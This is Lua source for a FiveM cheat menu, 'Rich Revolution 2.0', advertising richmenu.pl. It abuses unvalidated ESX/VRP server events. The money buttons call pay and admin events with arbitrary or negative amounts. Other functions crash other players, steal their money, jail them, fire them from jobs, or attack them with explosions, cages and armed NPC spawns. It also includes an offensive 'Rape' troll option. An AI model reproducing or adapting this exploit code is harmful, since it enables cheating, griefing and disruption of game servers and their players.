                if RichRevolution.Button("-» Ultimate moneymaker «-") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
			...
			elseif RichRevolution.Button("~g~Truckerjob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif RichRevolution.Button("~g~Admin give bank $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif RichRevolution.Button("~g~Admin give cash $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif RichRevolution.Button("~g~Postal job $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif RichRevolution.Button("~g~Bank security $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif RichRevolution.Button("~g~Slotmachine $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif RichRevolution.Button("~g~ LScustoms $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif RichRevolution.Button("~g~Slotmachine(2) $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif RichRevolution.Button("~g~Dirty money $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif RichRevolution.Button("~g~Delivery $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif RichRevolution.Button("~g~Taxijob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif RichRevolution.Button("~g~Taxijob 10.000x $") then
				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
			elseif RichRevolution.Button("~g~Pilot & Taxi (~g~ESX~s~) $") then
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					...
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
			elseif RichRevolution.Button("~g~Garbagejob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif RichRevolution.Button("~g~Paycheck $") then
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
                ...
                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("SelfMenu") then
			if RichRevolution.MenuButton("~g~→  ~s~Ped Menu", "PedMenu") then
                                elseif RichRevolution.Button("~s~Yourself ~g~Heal") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif RichRevolution.Button("Get Some ~b~Armor") then
                    SetPedArmour(PlayerPedId(), 200)
				elseif RichRevolution.Button("Go Invisible") then
    ...
    SetModelAsNoLongerNeeded(model2)
					elseif RichRevolution.Button("Go Visible Again") then
...
elseif RichRevolution.Button("Get some $ ~b~(VRP)") then
    ...
    TriggerServerEvent('PayForRepairNow',-100000)
    TriggerServerEvent('PayForRepairNow',-100000)
    drawNotification("~p~Rich Revolution 2.0 $$")
				elseif RichRevolution.Button("Get Some $ ~g~(~g~ESX~s~)") then
				...
				drawNotification("~p~Rich Revolution 2.0 $$")
                elseif RichRevolution.Button("Revive yourself (~g~ESX~s~)") then
                    TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent("ambulancier:selfRespawn")
				elseif RichRevolution.Button("Open Jail Menu (~g~ESX~s~)") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
                elseif RichRevolution.Button("Get Out Of Jail (~g~ESX~s~)") then
                ...
                then
                elseif RichRevolution.Button("~r~Suicide") then
                    SetEntityHealth(PlayerPedId(), 0)
                end

                RichRevolution.Display()
			elseif RichRevolution.IsMenuOpened("PedMenu") then
				if RichRevolution.ComboBox("MalePed", peds2, currentPedd, selectedPedd, function(currentIndex, selectedIndex)
                    currentPedd = currentIndex
                    selectedPedd = selectedIndex
                end)
                then
				elseif RichRevolution.ComboBox("FemalePed", peds3, currentPeddd, selectedPeddd, function(currentIndex, selectedIndex)
                    currentPeddd = currentIndex
                    selectedPeddd = selectedIndex
                end)
                then
				elseif RichRevolution.ComboBox("AnimalPed", peds4, currentPedddd, selectedPedddd, function(currentIndex, selectedIndex)
                    currentPedddd = currentIndex
                    selectedPedddd = selectedIndex
                end)
                then
			elseif RichRevolution.Button("Change To Selected ~b~Male") then
					Deer.Destroy()
		Wait(100)
	...
	elseif RichRevolution.Button("Change To Selected ~p~Female") then
		Deer.Destroy()
		Wait(100)
	...
	elseif RichRevolution.Button("Change To Selected ~y~Animal") then
			Deer.Destroy()
		Wait(100)
    ...
    SetModelAsNoLongerNeeded(model6)
		elseif RichRevolution.Button("Spawn A ~y~Deer ~s~And Ride It") then
     Deer.Create()
	Citizen.Wait(150)
	 Deer.Ride()
				elseif RichRevolution.Button("Change To Deafult") then
						Deer.Destroy()
		Wait(100)
				local model3 = GetHashKey("mp_m_freemode_01")
				local player3 = PlayerId()
    ...
    SetModelAsNoLongerNeeded(model3)
	elseif RichRevolution.Button("Change To ~y~Trevor") then
			Deer.Destroy()
		Wait(100)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model1)
	elseif RichRevolution.Button("Change To ~b~Michael") then
			Deer.Destroy()
		Wait(100)
	...
	elseif RichRevolution.Button("Change To ~g~Franklin") then
			Deer.Destroy()
		Wait(100)
	...
	elseif RichRevolution.Button("Change To ~r~Alien") then
			Deer.Destroy()
		Wait(100)
	...
	elseif RichRevolution.Button("Change To ~h~Bigfoot") then
			Deer.Destroy()
		Wait(100)
	...
	RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("OnlinePlayersMenu") then
                    for i = 0, 128 do
                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and RichRevolution.MenuButton("~g~→  ~s~NICK: "..GetPlayerName(i).." | ID: ~r~"..GetPlayerServerId(i).." | "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~Dead ~s~|" or "~g~Alive ~s~|"), "PlayerOptionsMenu") then
                            SelectedPlayer = i
                        end
                    end

                    RichRevolution.Display()
                elseif RichRevolution.IsMenuOpened("PlayerOptionsMenu") then
                    RichRevolution.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
                    if RichRevolution.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
                        SpectatePlayer(SelectedPlayer)
                    elseif RichRevolution.Button("Crash Player") then
                        CrashPlayer(GetPlayerPed(SelectedPlayer))
                    elseif RichRevolution.Button("Teleport To Player") then
                        drawNotification(
    ...
    elseif cP == 'n' then
        ...
        drawNotification(
            '~h~~r~Operation cancelled~s~.'
    					...
    					elseif RichRevolution.Button("Teleport To Player With Vehicle") then
										drawNotification(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
                ...
                elseif RichRevolution.Button("~g~Give ~w~Money") then
                ...
                elseif RichRevolution.Button('~b~FULL Armour ~s~Player') then
                    ...
                    elseif RichRevolution.MenuButton("~g~→  ~s~Troll Options", "PlayerTrollMenu") then
                    elseif RichRevolution.MenuButton("~g~→  ~s~ESX Options", "PlayerESXMenu") then
                    elseif RichRevolution.MenuButton("~g~→  ~s~Choose weapon", "SingleWepPlayer") then
                    Citizen.CreateThread(function()
                    asshat = true
                    ...
                    RichRevolution.Display()
                elseif RichRevolution.IsMenuOpened("PlayerESXMenu") then
                    if RichRevolution.MenuButton("~r~→  ~s~ESX Triggers", "PlayerESXTriggerMenu") then
                    elseif RichRevolution.MenuButton("~r~→  ~s~ESX Jobs", "PlayerESXJobMenu") then
                    end

                    RichRevolution.Display()
                elseif RichRevolution.IsMenuOpened("PlayerESXTriggerMenu") then
                    if RichRevolution.Button("ESX Revive") then
                    ...
                    DoScreenFadeIn(800)
					elseif RichRevolution.Button("Fire player from job (~g~ESX~s~)") then
				    FirePlayer(SelectedPlayer)
                    elseif RichRevolution.Button("ESX Give Money To Player From Your Wallet") then
                    ...
                    elseif RichRevolution.Button("ESX Steal Money From Player") then
                    ...
                    elseif RichRevolution.Button("ESX Handcuff Player") then
                        TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
                    elseif RichRevolution.Button("ESX Send To Jail") then
                        TriggerServerEvent("esx-qalle-jail:jailPlayer99", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                        TriggerServerEvent('ec49347f-474c-4b8e-a30d-9cc2476da5b3', GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                        TriggerServerEvent("esx-shit:jailPlayer", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                        TriggerServerEvent("esx-jailmisd:jailPlayer", GetPlayerServerId(i), 5000, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177")
                        ...
                        TriggerServerEvent("esx_jail:sendTooJail", GetPlayerServerId(i), 9937, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 1)
                                ...
                                TriggerServerEvent("esx-qalle-jail:wyslijwiezienie", GetPlayerServerId(i), 60*1, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 111)
                                TriggerServerEvent("arisonarp:wiezienie", GetPlayerServerId(i), 99999 * 60, "Rich Revolution l www.richmenu.pl l The Best Cheats! exerr#1177", 9999999999)
                    elseif RichRevolution.Button("ESX Get Out Of Jail") then
                    ...
                    RichRevolution.Display()
                elseif RichRevolution.IsMenuOpened("PlayerESXJobMenu") then
                    if RichRevolution.Button("Unemployed") then
                    ...
                    RichRevolution.Display()
                elseif RichRevolution.IsMenuOpened("PlayerTrollMenu") then
                    if RichRevolution.Button ("Fake Chat Message") then
				...
				elseif RichRevolution.Button("Ram w/ Custom Vehicle") then
                ...
                elseif RichRevolution.Button('~r~ISIS Explode') then
				...
				elseif RichRevolution.Button("Small invisible Explosion") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
                elseif RichRevolution.Button('~r~Rape') then
                    RequestModelSync('a_m_o_acult_01')
                    RequestAnimDict('rcmpaparazzo_2')
                    while not HasAnimDictLoaded('rcmpaparazzo_2') do
                        Citizen.Wait(0)
                ...
                elseif RichRevolution.Button('~r~Cage ~s~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    ...
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
                elseif RichRevolution.Button('Wall ~s~Player') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif RichRevolution.Button('Wall ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif RichRevolution.Button('Fuck Up ~s~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
				...
				elseif RichRevolution.Button("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                ...
                elseif RichRevolution.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
					...
					elseif RichRevolution.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif RichRevolution.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                ...
                elseif RichRevolution.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_railgun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
					...
					elseif RichRevolution.Button("Rain Agressive NPC") then
                    ...
                    elseif RichRevolution.MenuButton("~r~→  ~s~Spawn Props On Player", "SpawnPropsMenu") then
                    elseif RichRevolution.CheckBox(
                        "Freeze Player",
                        freezePlayer,
                        function(enabled)
                    ...
                    RichRevolution.Display()
                elseif RichRevolution.IsMenuOpened("SpawnPropsMenu") then
                    if RichRevolution.CheckBox(
                    ...
                    then
                    elseif RichRevolution.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif RichRevolution.Button("Weed") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif RichRevolution.Button("UFO") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif RichRevolution.Button("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif RichRevolution.Button("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("VehicleRamMenu") then
                if RichRevolution.Button("Futo") then
                ...
                elseif RichRevolution.Button("Bus") then
                    ...
                    RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if RichRevolution.Button(allWeapons[i]) then
                ...
                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("WeaponMenu") then
                if RichRevolution.MenuButton("~g~→  ~s~Single Weapon Spawner", "SingleWeaponMenu") then
                elseif RichRevolution.Button("Give All Weapons") then
                    for i = 1, #allWeapons do
                ...
                then
                elseif RichRevolution.MenuButton("~g~→  ~s~Weapon Customization", "WeaponCustomization") then
                elseif RichRevolution.MenuButton("~g~→  ~s~Bullet Gun Options", "BulletGunMenu") then
                end

                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("WeaponCustomization") then
                if RichRevolution.CheckBox(
                    "Rainbow Tint",
                    rainbowTint,
                    function(enabled)
                ...
                then
                elseif RichRevolution.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                ...
                then
                elseif RichRevolution.Button("~g~Add Special Finish") then
                ...
                elseif RichRevolution.Button("~r~Remove Special Finish") then
                ...
                elseif RichRevolution.Button("~g~Add Suppressor") then
                ...
                elseif RichRevolution.Button("~r~Remove Suppressor") then
                ...
                elseif RichRevolution.Button("~g~Add Scope") then
                ...
                elseif RichRevolution.Button("~r~Remove Scope") then
                ...
                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("BulletGunMenu") then
                if RichRevolution.CheckBox(
                    "Vehicle Gun",
                    vehicleGun,
                    function(enabled)
                ...
                then
                elseif RichRevolution.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                    currentVehicle = currentIndex
                    selectedVehicle = selectedIndex

                end)
                then
                elseif RichRevolution.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                ...
                then
                elseif RichRevolution.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
                ...
                then
                elseif RichRevolution.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
                ...
                RichRevolution.Display()
            elseif RichRevolution.IsMenuOpened("SingleWeaponMenu") then
                for i = 1, #allWeapons do
                    if RichRevolution.Button(allWeapons[i]) then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
                    end
                ...
                RichRevolution.Display()
            elseif IsDisabledControlPressed(0, 243) then
                if planeisbest then
